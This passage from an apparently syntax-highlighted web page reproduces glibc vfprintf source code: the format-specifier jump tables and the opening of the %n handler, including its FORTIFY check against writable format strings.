step1_jumps[31] =\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">    &#123;\t\t\t\t\t\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_unknown),\t\t\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_unknown),\t<span class=\"comment\">/* for &#x27; &#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_unknown),\t<span class=\"comment\">/* for &#x27;+&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_unknown),\t<span class=\"comment\">/* for &#x27;-&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_unknown),\t<span class=\"comment\">/* for &#x27;&lt;hash&gt;&#x27; */</span>\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_unknown),\t<span class=\"comment\">/* for &#x27;0&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_unknown),\t<span class=\"comment\">/* for &#x27;\\&#x27;&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_unknown),\t<span class=\"comment\">/* for &#x27;*&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_unknown),\t<span class=\"comment\">/* for &#x27;1&#x27;...&#x27;9&#x27; */</span>\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (precision),\t\t<span class=\"comment\">/* for &#x27;.&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (mod_half),\t\t<span class=\"comment\">/* for &#x27;h&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (mod_long),\t\t<span class=\"comment\">/* for &#x27;l&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (mod_longlong),\t<span class=\"comment\">/* for &#x27;L&#x27;, &#x27;q&#x27; */</span>\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (mod_size_t),\t\t<span class=\"comment\">/* for &#x27;z&#x27;, &#x27;Z&#x27; */</span>\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_percent),\t<span class=\"comment\">/* for &#x27;%&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_integer),\t<span class=\"comment\">/* for &#x27;d&#x27;, &#x27;i&#x27; */</span>\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_unsigned),\t<span class=\"comment\">/* for &#x27;u&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_octal),\t\t<span class=\"comment\">/* for &#x27;o&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_hexa),\t\t<span class=\"comment\">/* for &#x27;X&#x27;, &#x27;x&#x27; */</span>\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_float),\t\t<span class=\"comment\">/* for &#x27;E&#x27;, &#x27;e&#x27;, &#x27;F&#x27;, &#x27;f&#x27;, &#x27;G&#x27;, &#x27;g&#x27; */</span>\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_character),\t<span class=\"comment\">/* for &#x27;c&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_string),\t<span class=\"comment\">/* for &#x27;s&#x27;, &#x27;S&#x27; */</span>\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_pointer),\t<span class=\"comment\">/* for &#x27;p&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_number),\t<span class=\"comment\">/* for &#x27;n&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_strerror),\t<span class=\"comment\">/* for &#x27;m&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_wcharacter),\t<span class=\"comment\">/* for &#x27;C&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_floathex),\t<span class=\"comment\">/* for &#x27;A&#x27;, &#x27;a&#x27; */</span>\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (mod_ptrdiff_t),      <span class=\"comment\">/* for &#x27;t&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (mod_intmax_t),       <span class=\"comment\">/* for &#x27;j&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_unknown),       <span class=\"comment\">/* for &#x27;I&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_binary),\t<span class=\"comment\">/* for &#x27;B&#x27;, &#x27;b&#x27; */</span>\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">    &#125;;\t\t\t\t\t\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">    <span class=\"comment\">/* Step 2: after processing precision.  */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">    static JUMP_TABLE_TYPE step2_jumps[31] =\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">    &#123;\t\t\t\t\t\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_unknown),\t\t\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_unknown),\t<span class=\"comment\">/* for &#x27; &#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_unknown),\t<span class=\"comment\">/* for &#x27;+&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_unknown),\t<span class=\"comment\">/* for &#x27;-&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_unknown),\t<span class=\"comment\">/* for &#x27;&lt;hash&gt;&#x27; */</span>\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_unknown),\t<span class=\"comment\">/* for &#x27;0&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_unknown),\t<span class=\"comment\">/* for &#x27;\\&#x27;&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_unknown),\t<span class=\"comment\">/* for &#x27;*&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_unknown),\t<span class=\"comment\">/* for &#x27;1&#x27;...&#x27;9&#x27; */</span>\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_unknown),\t<span class=\"comment\">/* for &#x27;.&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (mod_half),\t\t<span class=\"comment\">/* for &#x27;h&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (mod_long),\t\t<span class=\"comment\">/* for &#x27;l&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (mod_longlong),\t<span class=\"comment\">/* for &#x27;L&#x27;, &#x27;q&#x27; */</span>\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (mod_size_t),\t\t<span class=\"comment\">/* for &#x27;z&#x27;, &#x27;Z&#x27; */</span>\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_percent),\t<span class=\"comment\">/* for &#x27;%&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_integer),\t<span class=\"comment\">/* for &#x27;d&#x27;, &#x27;i&#x27; */</span>\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_unsigned),\t<span class=\"comment\">/* for &#x27;u&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_octal),\t\t<span class=\"comment\">/* for &#x27;o&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_hexa),\t\t<span class=\"comment\">/* for &#x27;X&#x27;, &#x27;x&#x27; */</span>\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_float),\t\t<span class=\"comment\">/* for &#x27;E&#x27;, &#x27;e&#x27;, &#x27;F&#x27;, &#x27;f&#x27;, &#x27;G&#x27;, &#x27;g&#x27; */</span>\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_character),\t<span class=\"comment\">/* for &#x27;c&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_string),\t<span class=\"comment\">/* for &#x27;s&#x27;, &#x27;S&#x27; */</span>\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_pointer),\t<span class=\"comment\">/* for &#x27;p&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_number),\t<span class=\"comment\">/* for &#x27;n&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_strerror),\t<span class=\"comment\">/* for &#x27;m&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_wcharacter),\t<span class=\"comment\">/* for &#x27;C&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_floathex),\t<span class=\"comment\">/* for &#x27;A&#x27;, &#x27;a&#x27; */</span>\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (mod_ptrdiff_t),      <span class=\"comment\">/* for &#x27;t&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (mod_intmax_t),       <span class=\"comment\">/* for &#x27;j&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_unknown),       <span class=\"comment\">/* for &#x27;I&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_binary),\t<span class=\"comment\">/* for &#x27;B&#x27;, &#x27;b&#x27; */</span>\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">    &#125;;\t\t\t\t\t\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">    <span class=\"comment\">/* Step 3a: after processing first &#x27;h&#x27; modifier.  */</span>\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">    static JUMP_TABLE_TYPE step3a_jumps[31] =\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">    &#123;\t\t\t\t\t\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_unknown),\t\t\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_unknown),\t<span class=\"comment\">/* for &#x27; &#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_unknown),\t<span class=\"comment\">/* for &#x27;+&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_unknown),\t<span class=\"comment\">/* for &#x27;-&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_unknown),\t<span class=\"comment\">/* for &#x27;&lt;hash&gt;&#x27; */</span>\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_unknown),\t<span class=\"comment\">/* for &#x27;0&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_unknown),\t<span class=\"comment\">/* for &#x27;\\&#x27;&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_unknown),\t<span class=\"comment\">/* for &#x27;*&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_unknown),\t<span class=\"comment\">/* for &#x27;1&#x27;...&#x27;9&#x27; */</span>\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_unknown),\t<span class=\"comment\">/* for &#x27;.&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (mod_halfhalf),\t<span class=\"comment\">/* for &#x27;h&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_unknown),\t<span class=\"comment\">/* for &#x27;l&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_unknown),\t<span class=\"comment\">/* for &#x27;L&#x27;, &#x27;q&#x27; */</span>\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_unknown),\t<span class=\"comment\">/* for &#x27;z&#x27;, &#x27;Z&#x27; */</span>\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_percent),\t<span class=\"comment\">/* for &#x27;%&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_integer),\t<span class=\"comment\">/* for &#x27;d&#x27;, &#x27;i&#x27; */</span>\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_unsigned),\t<span class=\"comment\">/* for &#x27;u&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_octal),\t\t<span class=\"comment\">/* for &#x27;o&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_hexa),\t\t<span class=\"comment\">/* for &#x27;X&#x27;, &#x27;x&#x27; */</span>\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_unknown),\t<span class=\"comment\">/* for &#x27;E&#x27;, &#x27;e&#x27;, &#x27;F&#x27;, &#x27;f&#x27;, &#x27;G&#x27;, &#x27;g&#x27; */</span>\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_unknown),\t<span class=\"comment\">/* for &#x27;c&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_unknown),\t<span class=\"comment\">/* for &#x27;s&#x27;, &#x27;S&#x27; */</span>\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_unknown),\t<span class=\"comment\">/* for &#x27;p&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_number),\t<span class=\"comment\">/* for &#x27;n&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_unknown),\t<span class=\"comment\">/* for &#x27;m&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_unknown),\t<span class=\"comment\">/* for &#x27;C&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_unknown),\t<span class=\"comment\">/* for &#x27;A&#x27;, &#x27;a&#x27; */</span>\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_unknown),       <span class=\"comment\">/* for &#x27;t&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_unknown),       <span class=\"comment\">/* for &#x27;j&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_unknown),       <span class=\"comment\">/* for &#x27;I&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_binary),\t<span class=\"comment\">/* for &#x27;B&#x27;, &#x27;b&#x27; */</span>\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">    &#125;;\t\t\t\t\t\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">    <span class=\"comment\">/* Step 3b: after processing first &#x27;l&#x27; modifier.  */</span>\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">    static JUMP_TABLE_TYPE step3b_jumps[31] =\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">    &#123;\t\t\t\t\t\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_unknown),\t\t\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_unknown),\t<span class=\"comment\">/* for &#x27; &#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_unknown),\t<span class=\"comment\">/* for &#x27;+&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_unknown),\t<span class=\"comment\">/* for &#x27;-&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_unknown),\t<span class=\"comment\">/* for &#x27;&lt;hash&gt;&#x27; */</span>\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_unknown),\t<span class=\"comment\">/* for &#x27;0&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_unknown),\t<span class=\"comment\">/* for &#x27;\\&#x27;&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_unknown),\t<span class=\"comment\">/* for &#x27;*&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_unknown),\t<span class=\"comment\">/* for &#x27;1&#x27;...&#x27;9&#x27; */</span>\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_unknown),\t<span class=\"comment\">/* for &#x27;.&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_unknown),\t<span class=\"comment\">/* for &#x27;h&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (mod_longlong),\t<span class=\"comment\">/* for &#x27;l&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_unknown),\t<span class=\"comment\">/* for &#x27;L&#x27;, &#x27;q&#x27; */</span>\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_unknown),\t<span class=\"comment\">/* for &#x27;z&#x27;, &#x27;Z&#x27; */</span>\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_percent),\t<span class=\"comment\">/* for &#x27;%&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_integer),\t<span class=\"comment\">/* for &#x27;d&#x27;, &#x27;i&#x27; */</span>\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_unsigned),\t<span class=\"comment\">/* for &#x27;u&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_octal),\t\t<span class=\"comment\">/* for &#x27;o&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_hexa),\t\t<span class=\"comment\">/* for &#x27;X&#x27;, &#x27;x&#x27; */</span>\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_float),\t\t<span class=\"comment\">/* for &#x27;E&#x27;, &#x27;e&#x27;, &#x27;F&#x27;, &#x27;f&#x27;, &#x27;G&#x27;, &#x27;g&#x27; */</span>\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_character),\t<span class=\"comment\">/* for &#x27;c&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_string),\t<span class=\"comment\">/* for &#x27;s&#x27;, &#x27;S&#x27; */</span>\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_pointer),\t<span class=\"comment\">/* for &#x27;p&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_number),\t<span class=\"comment\">/* for &#x27;n&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_strerror),\t<span class=\"comment\">/* for &#x27;m&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_wcharacter),\t<span class=\"comment\">/* for &#x27;C&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_floathex),\t<span class=\"comment\">/* for &#x27;A&#x27;, &#x27;a&#x27; */</span>\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_unknown),       <span class=\"comment\">/* for &#x27;t&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_unknown),       <span class=\"comment\">/* for &#x27;j&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_unknown),       <span class=\"comment\">/* for &#x27;I&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_binary),\t<span class=\"comment\">/* for &#x27;B&#x27;, &#x27;b&#x27; */</span>\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">    &#125;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> STEP4_TABLE\t\t\t\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">    <span class=\"comment\">/* Step 4: processing format specifier.  */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">    static JUMP_TABLE_TYPE step4_jumps[31] =\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">    &#123;\t\t\t\t\t\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_unknown),\t\t\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_unknown),\t<span class=\"comment\">/* for &#x27; &#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_unknown),\t<span class=\"comment\">/* for &#x27;+&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_unknown),\t<span class=\"comment\">/* for &#x27;-&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_unknown),\t<span class=\"comment\">/* for &#x27;&lt;hash&gt;&#x27; */</span>\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_unknown),\t<span class=\"comment\">/* for &#x27;0&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_unknown),\t<span class=\"comment\">/* for &#x27;\\&#x27;&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_unknown),\t<span class=\"comment\">/* for &#x27;*&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_unknown),\t<span class=\"comment\">/* for &#x27;1&#x27;...&#x27;9&#x27; */</span>\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_unknown),\t<span class=\"comment\">/* for &#x27;.&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_unknown),\t<span class=\"comment\">/* for &#x27;h&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_unknown),\t<span class=\"comment\">/* for &#x27;l&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_unknown),\t<span class=\"comment\">/* for &#x27;L&#x27;, &#x27;q&#x27; */</span>\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_unknown),\t<span class=\"comment\">/* for &#x27;z&#x27;, &#x27;Z&#x27; */</span>\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_percent),\t<span class=\"comment\">/* for &#x27;%&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_integer),\t<span class=\"comment\">/* for &#x27;d&#x27;, &#x27;i&#x27; */</span>\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_unsigned),\t<span class=\"comment\">/* for &#x27;u&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_octal),\t\t<span class=\"comment\">/* for &#x27;o&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_hexa),\t\t<span class=\"comment\">/* for &#x27;X&#x27;, &#x27;x&#x27; */</span>\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_float),\t\t<span class=\"comment\">/* for &#x27;E&#x27;, &#x27;e&#x27;, &#x27;F&#x27;, &#x27;f&#x27;, &#x27;G&#x27;, &#x27;g&#x27; */</span>\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_character),\t<span class=\"comment\">/* for &#x27;c&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_string),\t<span class=\"comment\">/* for &#x27;s&#x27;, &#x27;S&#x27; */</span>\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_pointer),\t<span class=\"comment\">/* for &#x27;p&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_number),\t<span class=\"comment\">/* for &#x27;n&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_strerror),\t<span class=\"comment\">/* for &#x27;m&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_wcharacter),\t<span class=\"comment\">/* for &#x27;C&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_floathex),\t<span class=\"comment\">/* for &#x27;A&#x27;, &#x27;a&#x27; */</span>\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_unknown),       <span class=\"comment\">/* for &#x27;t&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_unknown),       <span class=\"comment\">/* for &#x27;j&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_unknown),       <span class=\"comment\">/* for &#x27;I&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_binary),\t<span class=\"comment\">/* for &#x27;B&#x27;, &#x27;b&#x27; */</span>\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">    &#125;</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h4 id=\"LABEL-form-number\"><a href=\"#LABEL-form-number\" class=\"headerlink\" title=\"LABEL (form_number)\"></a>LABEL (form_number)</h4><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">LABEL (form_number):\t\t\t\t\t\t      \\</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ((mode_flags &amp; PRINTF_FORTIFY) != <span class=\"number\">0</span>)\t\t\t\t      \\</span><br><span class=\"line\">\t&#123;\t\t\t\t\t\t\t\t      \\</span><br><span class=\"line\">\t  <span class=\"keyword\">if</span> (! readonly_format)\t\t\t\t\t      \\</span><br><span class=\"line\">\t    &#123;\t\t\t\t\t\t\t\t      \\</span><br><span class=\"line\">\t      <span class=\"keyword\">extern</span> <span class=\"type\">int</span> __readonly_area (<span class=\"type\">const</span> <span class=\"type\">void</span> *, <span class=\"type\">size_t</span>)\t\t      \\</span><br><span class=\"line\">\t\tattribute_hidden;\t\t\t\t\t      \\</span><br><span class=\"line\">\t      readonly_format\t\t\t\t\t\t      \\</span><br><span class=\"line\">\t\t= __readonly_area (format, ((STR_LEN (format) + <span class=\"number\">1</span>)\t      \\</span><br><span class=\"line\">\t\t\t\t\t    * <span class=\"keyword\">sizeof</span> (CHAR_T)));\t      \\</span><br><span class=\"line\">\t    &#125;\t\t\t\t\t\t\t\t      \\</span><br><span class=\"line\">\t  <span class=\"keyword\">if</span> (readonly_format &lt; <span class=\"number\">0</span>)\t\t\t\t\t      \\</span><br><span class=\"line\">\t    __libc_fatal (<span class=\"string\">&quot;*** %n in writable segment detected ***\\n&quot;</span>);\t      \\</span><br><span class=\"line\">\t&#125;\t\t\t\t\t\t\t\t      \\</span><br><span class=\"line\">      <span class=\"comment\">/* Answer the count of characters written.  */</span>\t\t\t      \\</span><br><span class=\"line\">      <span class=\"type\">void</span> *ptrptr = process_arg_pointer ();\t\t\t\t      \\</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (is_longlong)\t\t\t\t\t\t\t      \\</span><br><span class=\"line\">\t*(<span class=\"type\">long</span> <span class=\"type\">long</span> <span class=\"type\">int</span> *) ptrptr = 